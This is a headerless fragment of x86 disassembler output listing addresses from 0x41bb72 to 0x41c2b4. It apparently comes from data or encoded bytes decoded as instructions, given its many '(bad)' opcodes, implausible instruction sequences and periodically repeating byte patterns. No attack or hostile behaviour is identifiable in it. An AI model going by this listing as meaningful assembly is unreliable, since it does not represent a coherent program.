  41bb72:	bound  eax,QWORD PTR [eax+0x25]
  41bb75:	add    BYTE PTR [esi+0x40],ah
  41bb78:	add    eax,0x40404143
  41bb7d:	inc    ebx
  41bb7e:	add    BYTE PTR [eax],al
  41bb80:	add    BYTE PTR [edx-0x34],ah
  41bb83:	inc    eax
  41bb84:	add    eax,0x40004041
  41bb89:	inc    ecx
  41bb8a:	int3   
  41bb8b:	add    BYTE PTR [ebx-0x7c],al
  41bb8e:	add    eax,0x5406240
  41bb93:	(bad)  
  41bb94:	retf   
  41bb95:	shl    BYTE PTR [edx],0xc8
  41bb98:	ror    BYTE PTR [eax],0x44
  41bb9b:	test   eax,0x46cbb068
  41bba0:	les    ebp,FWORD PTR [ebx+0x6552942c]
  41bba6:	xor    eax,0xd27149cf
  41bbab:	inc    edx
  41bbac:	bound  eax,QWORD PTR [ecx+0x79]
  41bbaf:	rol    ecx,cl
  41bbb1:	data16 int 0x3f
  41bbb4:	cmp    BYTE PTR [eax],ah
  41bbb6:	and    al,BYTE PTR [eax-0x3e]
  41bbb9:	add    cl,BYTE PTR [edx]
  41bbbb:	in     al,0x63
  41bbbd:	mov    al,ds:0x3a7a6046
  41bbc2:	inc    eax
  41bbc3:	bound  ebx,QWORD PTR [eax+0x41]
  41bbc6:	add    eax,0x40404340
  41bbcb:	inc    ebx
  41bbcc:	inc    eax
  41bbcd:	test   BYTE PTR [eax],al
  41bbcf:	add    eax,0x40624041
  41bbd4:	inc    eax
  41bbd5:	add    BYTE PTR [edx+0x5],ah
  41bbd8:	inc    ebx
  41bbd9:	add    BYTE PTR [eax+0x78],al
  41bbdc:	inc    ecx
  41bbdd:	add    BYTE PTR [eax+0x41],bl
  41bbe0:	(bad)  
  41bbe1:	(bad)  
  41bbe2:	cmp    eax,0x402c057c
  41bbe7:	jle    0x41bc29
  41bbe9:	inc    esp
  41bbea:	ret    
  41bbeb:	sub    BYTE PTR [edi+0x29c140e7],al
  41bbf1:	sub    al,0x46
  41bbf3:	adc    BYTE PTR [ecx+0x4a],cl
  41bbf6:	inc    eax
  41bbf7:	push   esp
  41bbf8:	data16 rol BYTE PTR [edx],1
  41bbfb:	inc    edx
  41bbfc:	xor    ebp,DWORD PTR [eax-0x3a7e3eb0]
  41bc02:	xchg   esi,esi
  41bc04:	inc    eax
  41bc05:	inc    edx
  41bc06:	inc    eax
  41bc07:	and    al,0x43
  41bc09:	pusha  
  41bc0a:	arpl   WORD PTR [edx+0x40],ax
  41bc0d:	sub    al,BYTE PTR [eax-0x3c]
  41bc10:	cmp    dh,0x4c
  41bc13:	ss inc ecx
  41bc15:	inc    ecx
  41bc16:	inc    eax
  41bc17:	ins    DWORD PTR es:[edi],dx
  41bc18:	inc    eax
  41bc19:	test   BYTE PTR [eax],al
  41bc1b:	int3   
  41bc1c:	bound  eax,QWORD PTR ds:0xcc840f41
  41bc22:	inc    ebx
  41bc23:	add    BYTE PTR [eax+0x0],al
  41bc26:	inc    eax
  41bc27:	inc    eax
  41bc28:	inc    eax
  41bc29:	int3   
  41bc2a:	add    BYTE PTR ds:0x62404341,al
  41bc30:	pop    eax
  41bc31:	add    BYTE PTR [ebx+0x40],al
  41bc34:	bound  ecx,QWORD PTR [edi]
  41bc36:	inc    eax
  41bc37:	cs inc esp
  41bc39:	aas    
  41bc3a:	pushf  
  41bc3b:	inc    esp
  41bc3c:	inc    ebx
  41bc3d:	push   eax
  41bc3e:	out    dx,al
  41bc3f:	push   es
  41bc40:	sub    al,0xdd
  41bc42:	push   0x4740797d
  41bc47:	dec    ecx
  41bc48:	into   
  41bc49:	push   edx
  41bc4a:	xor    eax,DWORD PTR [edx-0x38]
  41bc4d:	inc    eax
  41bc4e:	rol    BYTE PTR [eax-0x7fb39e6c],0x15
  41bc55:	inc    eax
  41bc56:	and    esp,DWORD PTR [esi]
  41bc58:	test   ecx,ebx
  41bc5a:	or     eax,0x4e10dcc3
  41bc5f:	jno    0x41bca5
  41bc61:	loopne 0x41bcde
  41bc63:	dec    edx
  41bc64:	fs inc eax
  41bc66:	les    eax,FWORD PTR [ebx]
  41bc68:	sub    al,0xdc
  41bc6a:	inc    edx
  41bc6b:	arpl   WORD PTR [eax+0x40],ax
  41bc6e:	test   eax,0xd665cc03
  41bc73:	cmp    BYTE PTR [eax],al
  41bc75:	add    BYTE PTR [eax+0x40],al
  41bc78:	cmovno eax,DWORD PTR ds:0x40056243
  41bc7f:	int3   
  41bc80:	add    ah,cl
  41bc82:	inc    eax
  41bc83:	inc    eax
  41bc84:	bound  eax,QWORD PTR [ecx+0x0]
  41bc87:	add    BYTE PTR [edi],cl
  41bc89:	inc    ebx
  41bc8a:	inc    eax
  41bc8b:	inc    eax
  41bc8c:	add    BYTE PTR [ecx+0x43],al
  41bc8f:	add    eax,0x40256240
  41bc94:	bound  eax,QWORD PTR [eax]
  41bc96:	rol    BYTE PTR [eax+0x71],cl
  41bc99:	add    DWORD PTR [ebp+0x0],ecx
  41bc9c:	sbb    al,0x63
  41bc9e:	lds    edx,FWORD PTR [eax]
  41bca0:	shl    BYTE PTR [eax-0x73],0x4f
  41bca4:	(bad)  
  41bca5:	leave  
  41bca6:	dec    edi
  41bca7:	inc    eax
  41bca8:	xor    DWORD PTR [edi+0x5bd44],eax
  41bcae:	int3   
  41bcaf:	inc    eax
  41bcb0:	inc    ecx
  41bcb1:	inc    eax
  41bcb2:	inc    ebx
  41bcb3:	bound  esp,QWORD PTR ds:0x41400043
  41bcb9:	add    BYTE PTR [eax],al
  41bcbb:	add    eax,0x43624062
  41bcc0:	inc    ecx
  41bcc1:	inc    eax
  41bcc2:	inc    eax
  41bcc3:	inc    eax
  41bcc4:	add    eax,0x40624340
  41bcc9:	add    eax,0x40664140
  41bcce:	mov    ebp,0x454041aa
  41bcd3:	bound  ebp,QWORD PTR [ecx+esi*2]
  41bcd6:	pusha  
  41bcd7:	xchg   ecx,eax
  41bcd8:	dec    eax
  41bcd9:	inc    ecx
  41bcda:	inc    eax
  41bcdb:	test   dl,cl
  41bcdd:	mov    eax,0xd03d6462
  41bce2:	and    al,0x2d
  41bce4:	(bad)
  41bce7:	adc    ebx,eax
  41bce9:	inc    eax
  41bcea:	jmp    0x45f7:0xc95d4558
  41bcf1:	inc    eax
  41bcf2:	out    0x1,eax
  41bcf4:	(bad)  
  41bcf5:	cmp    DWORD PTR fs:[ebx+0x78],eax
  41bcf9:	inc    eax
  41bcfa:	inc    ecx
  41bcfb:	std    
  41bcfc:	inc    esp
  41bcfd:	jns    0x41bd59
  41bcff:	cmp    eax,0x71634080
  41bd04:	sub    al,0xe8
  41bd06:	pusha  
  41bd07:	inc    ebx
  41bd08:	add    BYTE PTR ds:0x41107840,al
  41bd0e:	bound  eax,QWORD PTR [eax+0x40]
  41bd11:	sldt   WORD PTR [eax-0x34]
  41bd15:	js     0x41bd79
  41bd17:	add    eax,0x40664143
  41bd1c:	inc    ebx
  41bd1d:	add    BYTE PTR [ecx+0x5],al
  41bd20:	js     0x41bd62
  41bd22:	bound  eax,QWORD PTR [eax+0x0]
  41bd25:	inc    eax
  41bd26:	or     BYTE PTR [eax+0x40],al
  41bd29:	inc    esi
  41bd2a:	or     eax,ecx
  41bd2c:	arpl   WORD PTR [eax],sp
  41bd2e:	bound  edi,QWORD PTR [ecx-0x2f]
  41bd31:	xor    ebx,DWORD PTR [esi-0x2b]
  41bd34:	inc    edi
  41bd35:	arpl   WORD PTR [esi],si
  41bd37:	icebp  
  41bd38:	inc    eax
  41bd39:	push   ecx
  41bd3a:	retf   
  41bd3b:	inc    edi
  41bd3c:	ficom  DWORD PTR [esi+0x3e]
  41bd3f:	bound  eax,QWORD PTR [eax+0x43]
  41bd42:	dec    esp
  41bd43:	out    dx,al
  41bd44:	fldenv [eiz*8-0x39bebfff]
  41bd4b:	inc    esp
  41bd4c:	and    eax,0x3fd452ab
  41bd51:	inc    eax
  41bd52:	jae    0x41bd80
  41bd54:	xor    al,0x1
  41bd56:	pop    eax
  41bd57:	outs   dx,BYTE PTR ds:[esi]
  41bd58:	inc    eax
  41bd59:	xor    eax,DWORD PTR [eax-0x3a]
  41bd5c:	inc    esp
  41bd5d:	test   eax,0x40404341
  41bd62:	add    eax,0x434162
  41bd67:	inc    eax
  41bd68:	add    BYTE PTR [edx+0x5],ah
  41bd6b:	inc    eax
  41bd6c:	adc    BYTE PTR [edx+0x40],ah
  41bd6f:	inc    ebx
  41bd70:	inc    ecx
  41bd71:	add    eax,0x4340
  41bd76:	add    eax,0x404162
  41bd7b:	add    BYTE PTR [eax+0x43],al
  41bd7e:	inc    eax
  41bd7f:	add    eax,0x6740c402
  41bd84:	jp     0x41bd53
  41bd86:	hlt    
  41bd87:	gs retf 
  41bd89:	dec    edi
  41bd8a:	inc    eax
  41bd8b:	inc    ecx
  41bd8c:	jns    0x41bdcf
  41bd8e:	addr16 pop es
  41bd90:	aas    
  41bd91:	dec    esi
  41bd92:	cmp    al,0x53
  41bd94:	shr    dh,0xa8
  41bd97:	nop
  41bd98:	das    
  41bd99:	xchg   DWORD PTR [eax+0x40],eax
  41bd9c:	cs inc esp
  41bd9e:	adc    ch,BYTE PTR [ecx]
  41bda0:	push   edx
  41bda1:	pop    esp
  41bda2:	inc    eax
  41bda3:	fwait
  41bda4:	mov    ds:0xd34512c,al
  41bda9:	ds inc eax
  41bdab:	and    esp,ebx
  41bdad:	(bad)  
  41bdae:	retf   
  41bdaf:	lods   al,BYTE PTR ds:[esi]
  41bdb0:	loop   0x41be2a
  41bdb2:	cs inc eax
  41bdb4:	add    BYTE PTR [eax],al
  41bdb6:	inc    ecx
  41bdb7:	inc    ebx
  41bdb8:	add    eax,0x41784062
  41bdbd:	inc    eax
  41bdbe:	inc    eax
  41bdbf:	add    BYTE PTR [edi],cl
  41bdc1:	bound  eax,QWORD PTR [ebx+0x0]
  41bdc4:	add    eax,0x25006240
  41bdc9:	inc    eax
  41bdca:	add    eax,0x40254143
  41bdcf:	add    eax,0x1d620000
  41bdd4:	ret    0x4c4d
  41bdd7:	into   
  41bdd8:	mov    ecx,0x244440c2
  41bddd:	lea    ecx,ds:0x405d6224
  41bde3:	sub    al,0x77
  41bde5:	inc    esp
  41bde6:	retf   
  41bde7:	test   BYTE PTR [ebx],al
  41bde9:	mov    WORD PTR [eax+0x49],es
  41bdec:	shr    BYTE PTR [ecx+eiz*2],0xf5
  41bdf0:	cmp    al,bl
  41bdf2:	inc    eax
  41bdf3:	inc    eax
  41bdf4:	xor    dl,al
  41bdf6:	xor    al,0xc2
  41bdf8:	push   edx
  41bdf9:	cmp    al,0xd7
  41bdfb:	xor    al,0x43
  41bdfd:	add    BYTE PTR [eax],al
  41bdff:	add    BYTE PTR [ecx+0x40],al
  41be02:	bound  esp,QWORD PTR [esi+0x0]
  41be05:	inc    eax
  41be06:	add    eax,0x5400000
  41be0b:	inc    ecx
  41be0c:	inc    eax
  41be0d:	inc    eax
  41be0e:	bound  esp,QWORD PTR ds:0x25050043
  41be14:	inc    ecx
  41be15:	inc    ebx
  41be16:	inc    eax
  41be17:	test   BYTE PTR [eax+0x0],al
  41be1a:	bound  ebx,QWORD PTR [eax+0x62]
  41be1d:	inc    ecx
  41be1e:	inc    eax
  41be1f:	push   ecx
  41be20:	aad    0x80
  41be22:	into   
  41be23:	les    eax,FWORD PTR [edi-0x5e]
  41be26:	pop    ds
  41be27:	ret    0xc547
  41be2a:	mov    ds:0x42e7404f,al
  41be2f:	cmp    dh,ch
  41be31:	dec    ecx
  41be32:	arpl   WORD PTR [ecx+ebp*2+0x44282435],sp
  41be39:	push   edx
  41be3a:	lods   al,BYTE PTR ds:[esi]
  41be3b:	add    eax,0xc0572d4c
  41be40:	sub    al,0xc8
  41be42:	add    eax,0x418ec87b
  41be47:	jno    0x41be09
  41be49:	es leave 
  41be4b:	mov    al,0x15
  41be4d:	adc    DWORD PTR ds:0xa099cdea,0x49778005
  41be57:	inc    eax
  41be58:	leave  
  41be59:	adc    BYTE PTR [edx+0x40],ah
  41be5c:	inc    ecx
  41be5d:	and    eax,0x40000500
  41be62:	inc    ebx
  41be63:	add    eax,0x40624041
  41be68:	inc    ebx
  41be69:	add    eax,0x43402541
  41be6e:	bound  eax,QWORD PTR [eax+0x43]
  41be71:	int3   
  41be72:	inc    eax
  41be73:	bound  eax,QWORD PTR [eax]
  41be75:	inc    ecx
  41be76:	inc    eax
  41be77:	inc    eax
  41be78:	add    eax,0xcb91a805
  41be7d:	gs push edx
  41be7f:	inc    eax
  41be80:	jp     0x41bea8
  41be82:	adc    BYTE PTR [eax+ecx*2+0x16],cl
  41be86:	aam    0x27
  41be88:	fs inc ecx
  41be8a:	inc    edx
  41be8b:	add    eax,0x40646c15
  41be90:	ror    BYTE PTR [ecx+0x3ec9cb42],0x2a
  41be97:	and    DWORD PTR [eax+edx*8],esi
  41be9a:	bound  eax,QWORD PTR [ebp+0x48]
  41be9d:	(bad)  
  41be9e:	xchg   esi,eax
  41be9f:	pop    ecx
  41bea0:	dec    ebx
  41bea1:	bound  ebp,QWORD PTR [eax]
  41bea3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41bea4:	dec    ecx
  41bea5:	push   0xffffffd9
  41bea7:	inc    edx
  41bea8:	ret    0x7344
  41beab:	bound  eax,QWORD PTR [eax+0x25]
  41beae:	add    BYTE PTR [esi+0x40],ah
  41beb1:	add    eax,0x40404143
  41beb6:	inc    ebx
  41beb7:	add    BYTE PTR [eax],al
  41beb9:	add    BYTE PTR [edx-0x34],ah
  41bebc:	inc    eax
  41bebd:	add    eax,0x40004041
  41bec2:	inc    ecx
  41bec3:	int3   
  41bec4:	add    BYTE PTR [ebx-0x7c],al
  41bec7:	add    eax,0x5406240
  41becc:	bound  eax,QWORD PTR [ebx+ebp*1+0x37256f4b]
  41bed3:	sub    al,0x60
  41bed5:	arpl   WORD PTR [eax],ax
  41bed7:	rol    bl,0x1f
  41beda:	push   ebx
  41bedb:	fisttp QWORD PTR ds:[edx+eiz*2+0x3a]
  41bee0:	sub    eax,DWORD PTR [ecx-0x31]
  41bee3:	lds    esp,FWORD PTR [ebx-0x44]
  41bee6:	adc    eax,0x4d573fbc
  41beeb:	cdq    
  41beec:	and    eax,0x69622052
  41bef1:	inc    eax
  41bef2:	shr    dh,0xe8
  41bef5:	xchg   DWORD PTR [eax+0x6bcb6840],ebp
  41befb:	inc    esp
  41befc:	or     eax,0x6f9b4b3c
  41bf01:	sub    DWORD PTR cs:[esi+eax*8],ebp
  41bf05:	inc    eax
  41bf06:	bound  ebx,QWORD PTR [eax+0x41]
  41bf09:	add    eax,0x40404340
  41bf0e:	inc    ebx
  41bf0f:	inc    eax
  41bf10:	test   BYTE PTR [eax],al
  41bf12:	add    eax,0x40624041
  41bf17:	inc    eax
  41bf18:	add    BYTE PTR [edx+0x5],ah
  41bf1b:	inc    ebx
  41bf1c:	add    BYTE PTR [eax+0x78],al
  41bf1f:	inc    ecx
  41bf20:	add    BYTE PTR [eax+0x41],bl
  41bf23:	bound  esi,QWORD PTR [ecx+0x35]
  41bf26:	and    ecx,esp
  41bf28:	popa   
  41bf29:	jne    0x41bf67
  41bf2b:	sub    DWORD PTR [edi+0x42],edi
  41bf2e:	add    eax,0x4dc141d9
  41bf33:	push   0xc1875620
  41bf38:	gs inc eax
  41bf3a:	test   BYTE PTR [eax],al
  41bf3c:	int3   
  41bf3d:	bound  eax,QWORD PTR ds:0xcc840f41
  41bf43:	inc    ebx
  41bf44:	add    BYTE PTR [eax+0x0],al
  41bf47:	inc    eax
  41bf48:	inc    eax
  41bf49:	inc    eax
  41bf4a:	int3   
  41bf4b:	add    BYTE PTR ds:0x62404341,al
  41bf51:	pop    eax
  41bf52:	add    BYTE PTR [ebx+0x40],al
  41bf55:	bound  ecx,QWORD PTR [edi]
  41bf57:	inc    eax
  41bf58:	inc    ebp
  41bf59:	lea    ecx,[eax-0x78b8c382]
  41bf5f:	inc    eax
  41bf60:	rol    BYTE PTR [esp+eiz*2-0x34],0xb0
  41bf65:	mov    ch,BYTE PTR gs:[esi+0x65cc2c7a]
  41bf6c:	or     eax,0x7b40263f
  41bf71:	cmp    ch,BYTE PTR [eax+0x54]
  41bf74:	leave  
  41bf75:	test   BYTE PTR [ecx+eiz*1-0x38],ah
  41bf79:	int    0x65
  41bf7b:	pop    edi
  41bf7c:	dec    eax
  41bf7d:	ret    
  41bf7e:	scas   al,BYTE PTR es:[edi]
  41bf7f:	dec    edi
  41bf80:	ins    DWORD PTR es:[edi],dx
  41bf81:	inc    edx
  41bf82:	dec    esp
  41bf83:	fld    QWORD PTR [ecx+0x21]
  41bf86:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41bf87:	inc    eax
  41bf88:	int    0xfe
  41bf8a:	inc    eax
  41bf8b:	inc    esp
  41bf8c:	(bad)  
  41bf8d:	cli    
  41bf8e:	cli    
  41bf8f:	xor    bl,al
  41bf91:	inc    esp
  41bf92:	adc    DWORD PTR [eax+eiz*8+0x62],eax
  41bf96:	lods   al,BYTE PTR ds:[esi]
  41bf97:	add    BYTE PTR [eax],al
  41bf99:	inc    eax
  41bf9a:	inc    eax
  41bf9b:	cmovno eax,DWORD PTR ds:0x40056243
  41bfa2:	int3   
  41bfa3:	add    ah,cl
  41bfa5:	inc    eax
  41bfa6:	inc    eax
  41bfa7:	bound  eax,QWORD PTR [ecx+0x0]
  41bfaa:	add    BYTE PTR [edi],cl
  41bfac:	inc    ebx
  41bfad:	inc    eax
  41bfae:	inc    eax
  41bfaf:	add    BYTE PTR [ecx+0x43],al
  41bfb2:	add    eax,0x40256240
  41bfb7:	bound  eax,QWORD PTR [eax]
  41bfb9:	and    ah,BYTE PTR [esi+0x2c]
  41bfbc:	imul   esi,DWORD PTR [esi+0x62],0xffffffa8
  41bfc0:	sub    eax,0xcd38c265
  41bfc5:	and    ah,BYTE PTR [edx+eax*2+0x482b4119]
  41bfcc:	test   al,0x48
  41bfce:	sub    ah,BYTE PTR ds:[ebp+ebp*1+0x22]
  41bfd3:	popf   
  41bfd4:	adc    BYTE PTR [edx-0x23],ah
  41bfd7:	and    BYTE PTR [edi],al
  41bfd9:	inc    ecx
  41bfda:	pop    ebx
  41bfdb:	inc    esp
  41bfdc:	mov    esp,0xa30753b8
  41bfe1:	pop    ebx
  41bfe2:	shr    DWORD PTR [ecx+eax*2],0x7f
  41bfe6:	add    eax,0x4140cc00
  41bfeb:	inc    eax
  41bfec:	inc    ebx
  41bfed:	bound  esp,QWORD PTR ds:0x41400043
  41bff3:	add    BYTE PTR [eax],al
  41bff5:	add    eax,0x43624062
  41bffa:	inc    ecx
  41bffb:	inc    eax
  41bffc:	inc    eax
  41bffd:	inc    eax
  41bffe:	add    eax,0x40624340
  41c003:	add    eax,0x40664140
  41c008:	pushf  
  41c009:	(bad)  
  41c00a:	xlat   BYTE PTR ds:[ebx]
  41c00b:	inc    edx
  41c00c:	xor    esi,DWORD PTR [esi]
  41c00e:	push   0xe1591585
  41c013:	sub    al,0xc3
  41c015:	aad    0xac
  41c017:	push   edx
  41c018:	retf   
  41c019:	xor    al,0xa
  41c01b:	inc    eax
  41c01c:	adc    DWORD PTR [eax+0x62],edx
  41c01f:	dec    eax
  41c020:	pushf  
  41c021:	dec    esp
  41c022:	das    
  41c023:	sub    eax,eax
  41c025:	out    dx,al
  41c026:	les    esi,FWORD PTR [edx+0x41]
  41c029:	xor    dl,BYTE PTR [ebx-0x37bbc8a0]
  41c02f:	lds    eax,FWORD PTR [ebx+0x0]
  41c032:	add    eax,0x41107840
  41c037:	bound  eax,QWORD PTR [eax+0x40]
  41c03a:	sldt   WORD PTR [eax-0x34]
  41c03e:	js     0x41c0a2
  41c040:	add    eax,0x40664143
  41c045:	inc    ebx
  41c046:	add    BYTE PTR [ecx+0x5],al
  41c049:	js     0x41c08b
  41c04b:	bound  eax,QWORD PTR [eax+0x0]
  41c04e:	inc    eax
  41c04f:	mov    eax,ds:0x2c5b5954
  41c055:	addr16 arpl sp,bx
  41c058:	shr    DWORD PTR [esi],0xa0
  41c05b:	shl    BYTE PTR [edx+eax*2],0xe1
  41c05f:	push   ebx
  41c060:	dec    esp
  41c061:	add    eax,DWORD PTR [eax+0x24]
  41c064:	int    0x34
  41c066:	pusha  
  41c067:	test   al,0xd
  41c069:	out    0x33,eax
  41c06b:	push   esp
  41c06c:	dec    edx
  41c06d:	loop   0x41c094
  41c06f:	or     cl,bl
  41c071:	dec    esp
  41c072:	push   ecx
  41c073:	shr    dh,0x62
  41c076:	out    dx,al
  41c077:	cmp    eax,0x35402c67
  41c07c:	inc    ecx
  41c07d:	inc    ebx
  41c07e:	inc    eax
  41c07f:	inc    eax
  41c080:	add    eax,0x434162
  41c085:	inc    eax
  41c086:	add    BYTE PTR [edx+0x5],ah
  41c089:	inc    eax
  41c08a:	adc    BYTE PTR [edx+0x40],ah
  41c08d:	inc    ebx
  41c08e:	inc    ecx
  41c08f:	add    eax,0x4340
  41c094:	add    eax,0x404162
  41c099:	add    BYTE PTR [eax+0x43],al
  41c09c:	inc    eax
  41c09d:	add    eax,0x63f8c548
  41c0a2:	stos   DWORD PTR es:[edi],eax
  41c0a3:	icebp  
  41c0a4:	ins    BYTE PTR es:[edi],dx
  41c0a5:	xor    eax,0x8b52643c
  41c0aa:	mov    esp,0x32404085
  41c0af:	add    ecx,edi
  41c0b1:	cmp    al,0x5
  41c0b3:	dec    esp
  41c0b4:	cmp    ch,BYTE PTR [edi]
  41c0b6:	xchg   ebx,eax
  41c0b7:	adc    BYTE PTR [eax+0x45],al
  41c0ba:	inc    eax
  41c0bb:	add    BYTE PTR [eax],al
  41c0bd:	inc    ecx
  41c0be:	inc    ebx
  41c0bf:	add    eax,0x41784062
  41c0c4:	inc    eax
  41c0c5:	inc    eax
  41c0c6:	add    BYTE PTR [edi],cl
  41c0c8:	bound  eax,QWORD PTR [ebx+0x0]
  41c0cb:	add    eax,0x25006240
  41c0d0:	inc    eax
  41c0d1:	add    eax,0x40254143
  41c0d6:	add    eax,0xcb620000
  41c0db:	bound  ecx,QWORD PTR [edi+0x54]
  41c0de:	in     eax,dx
  41c0df:	sub    al,0x52
  41c0e1:	push   ebp
  41c0e2:	inc    ebp
  41c0e3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c0e4:	inc    ecx
  41c0e5:	ret    0x282c
  41c0e8:	push   eax
  41c0e9:	ds xor eax,0x442b430d
  41c0ef:	xchg   edx,eax
  41c0f0:	leave  
  41c0f1:	int3   
  41c0f2:	and    BYTE PTR [edx+0x40],0x58
  41c0f6:	sub    eax,0xc5522642
  41c0fb:	inc    eax
  41c0fc:	arpl   ax,ax
  41c0fe:	xor    BYTE PTR [edx+0x48],ah
  41c101:	adc    eax,0x2133fd4b
  41c106:	aad    0x2c
  41c108:	inc    ecx
  41c109:	rol    BYTE PTR [ebp+0x42],cl
  41c10c:	pop    edi
  41c10d:	inc    esp
  41c10e:	inc    ebx
  41c10f:	add    BYTE PTR [eax],al
  41c111:	add    BYTE PTR [ecx+0x40],al
  41c114:	bound  esp,QWORD PTR [esi+0x0]
  41c117:	inc    eax
  41c118:	add    eax,0x5400000
  41c11d:	inc    ecx
  41c11e:	inc    eax
  41c11f:	inc    eax
  41c120:	bound  esp,QWORD PTR ds:0x25050043
  41c126:	inc    ecx
  41c127:	inc    ebx
  41c128:	inc    eax
  41c129:	test   BYTE PTR [eax+0x0],al
  41c12c:	bound  ebx,QWORD PTR [eax+0x62]
  41c12f:	inc    ecx
  41c130:	inc    eax
  41c131:	sbb    bl,BYTE PTR [esi+ecx*1-0x58]
  41c135:	int3   
  41c136:	out    0x40,al
  41c138:	shr    BYTE PTR [edx+0x20],0xa4
  41c13c:	inc    eax
  41c13d:	imul   ebx,edi,0x36
  41c140:	push   ebp
  41c141:	sub    DWORD PTR fs:[edx+0x40],esp
  41c145:	add    BYTE PTR [ebx+0x6644601a],al
  41c14b:	push   ebx
  41c14c:	inc    eax
  41c14d:	fs jne 0x41c193
  41c150:	push   ebp
  41c151:	sub    al,0xf8
  41c153:	inc    ebx
  41c154:	mov    eax,ds:0xc46edeca
  41c159:	cs ror ebp,0xa9
  41c15d:	push   eax
  41c15e:	bound  eax,QWORD PTR [eax+0x22]
  41c161:	int    0xda
  41c163:	inc    ebx
  41c164:	inc    ebp
  41c165:	adc    BYTE PTR [edx+0x40],ah
  41c168:	inc    ecx
  41c169:	and    eax,0x40000500
  41c16e:	inc    ebx
  41c16f:	add    eax,0x40624041
  41c174:	inc    ebx
  41c175:	add    eax,0x43402541
  41c17a:	bound  eax,QWORD PTR [eax+0x43]
  41c17d:	int3   
  41c17e:	inc    eax
  41c17f:	bound  eax,QWORD PTR [eax]
  41c181:	inc    ecx
  41c182:	inc    eax
  41c183:	inc    eax
  41c184:	add    eax,0xa8bb3405
  41c189:	pop    ebx
  41c18a:	loopne 0x41c194
  41c18c:	mov    esp,0x721f1e3c
  41c191:	shr    BYTE PTR [edx-0x5d1796d0],0x3f
  41c198:	inc    eax
  41c199:	outs   dx,BYTE PTR ds:[esi]
  41c19a:	fs maskmovq mm4,(bad)
  41c19c:	mul    DWORD PTR [edx+0x62]
  41c19f:	leave  
  41c1a0:	and    edx,DWORD PTR [ebx-0x7]
  41c1a3:	xor    al,0x5f
  41c1a5:	dec    ecx
  41c1a6:	push   esi
  41c1a7:	lods   al,BYTE PTR ds:[esi]
  41c1a8:	sbb    al,dl
  41c1aa:	bound  eax,QWORD PTR [eax+0x25]
  41c1ad:	add    BYTE PTR [esi+0x40],ah
  41c1b0:	add    eax,0x40404143
  41c1b5:	inc    ebx
  41c1b6:	add    BYTE PTR [eax],al
  41c1b8:	add    BYTE PTR [edx-0x34],ah
  41c1bb:	inc    eax
  41c1bc:	add    eax,0x40004041
  41c1c1:	inc    ecx
  41c1c2:	int3   
  41c1c3:	add    BYTE PTR [ebx-0x7c],al
  41c1c6:	add    eax,0x5406240
  41c1cb:	bound  ebx,QWORD PTR [edi]
  41c1cd:	frstor gs:[ebp+0x4d]
  41c1d1:	fcom   DWORD PTR [edx+0x3d]
  41c1d4:	sbb    eax,0xd571f78e
  41c1d9:	jmp    0x41c21c
  41c1db:	dec    esp
  41c1dc:	bound  ebp,QWORD PTR [ebp+0x5f]
  41c1df:	arpl   WORD PTR [edx+0x7e],cx
  41c1e2:	pop    edx
  41c1e3:	rol    BYTE PTR [eax+0x62],0x58
  41c1e7:	inc    ecx
  41c1e8:	add    eax,0x40404340
  41c1ed:	inc    ebx
  41c1ee:	inc    eax
  41c1ef:	test   BYTE PTR [eax],al
  41c1f1:	add    eax,0x40624041
  41c1f6:	inc    eax
  41c1f7:	add    BYTE PTR [edx+0x5],ah
  41c1fa:	inc    ebx
  41c1fb:	add    BYTE PTR [eax+0x78],al
  41c1fe:	inc    ecx
  41c1ff:	add    BYTE PTR [eax+0x41],bl
  41c202:	(bad)  
  41c203:	(bad)
  41c206:	inc    eax
  41c207:	xchg   esp,eax
  41c208:	push   esi
  41c209:	inc    eax
  41c20a:	adc    eax,0xbf4e014a
  41c20f:	adc    edi,edx
  41c211:	pusha  
  41c212:	jnp    0x41c201
  41c214:	test   al,0xc0
  41c216:	add    eax,0x862d6ac
  41c21b:	inc    esp
  41c21c:	adc    cl,BYTE PTR [edi-0x7a]
  41c21f:	retf   
  41c220:	sbb    eax,0x412cc142
  41c225:	fsub   DWORD PTR [ebp+edx*1-0x1d]
  41c229:	das    
  41c22a:	cvtpi2ps xmm0,QWORD PTR [esi-0x13]
  41c22e:	inc    edx
  41c22f:	inc    ecx
  41c230:	xchg   ebp,eax
  41c231:	pop    esi
  41c232:	ret    0x1456
  41c235:	inc    edx
  41c236:	dec    edi
  41c237:	ins    BYTE PTR es:[edi],dx
  41c238:	dec    esi
  41c239:	inc    eax
  41c23a:	daa    
  41c23b:	(bad)  
  41c23c:	int    0x43
  41c23e:	cld    
  41c23f:	rol    bh,0x40
  41c242:	test   BYTE PTR [eax],al
  41c244:	int3   
  41c245:	bound  eax,QWORD PTR ds:0xcc840f41
  41c24b:	inc    ebx
  41c24c:	add    BYTE PTR [eax+0x0],al
  41c24f:	inc    eax
  41c250:	inc    eax
  41c251:	inc    eax
  41c252:	int3   
  41c253:	add    BYTE PTR ds:0x62404341,al
  41c259:	pop    eax
  41c25a:	add    BYTE PTR [ebx+0x40],al
  41c25d:	bound  ecx,QWORD PTR [edi]
  41c25f:	inc    eax
  41c260:	xor    al,0x1
  41c262:	inc    esp
  41c263:	inc    esp
  41c264:	mov    ebp,0x27b3b5f
  41c269:	shr    BYTE PTR [ecx+eax*2],0x6b
  41c26d:	mov    eax,0x32404744
  41c272:	sub    ah,dh
  41c274:	or     al,0x6b
  41c276:	bound  ebp,QWORD PTR [esi-0x6b]
  41c279:	inc    ecx
  41c27a:	adc    eax,0x443a342e
  41c27f:	jnp    0x41c2b6
  41c281:	ror    BYTE PTR [ecx+0x423c80a8],0xaa
  41c288:	data16 sub al,0x44
  41c28b:	adc    DWORD PTR [eax],eax
  41c28d:	add    BYTE PTR [eax+0x40],al
  41c290:	cmovno eax,DWORD PTR ds:0x40056243
  41c297:	int3   
  41c298:	add    ah,cl
  41c29a:	inc    eax
  41c29b:	inc    eax
  41c29c:	bound  eax,QWORD PTR [ecx+0x0]
  41c29f:	add    BYTE PTR [edi],cl
  41c2a1:	inc    ebx
  41c2a2:	inc    eax
  41c2a3:	inc    eax
  41c2a4:	add    BYTE PTR [ecx+0x43],al
  41c2a7:	add    eax,0x40256240
  41c2ac:	bound  eax,QWORD PTR [eax]
  41c2ae:	lds    esp,FWORD PTR [ebx+0x39]
  41c2b1:	xor    al,BYTE PTR [eax+0x2a]
  41c2b4:	sub    al,0xcc
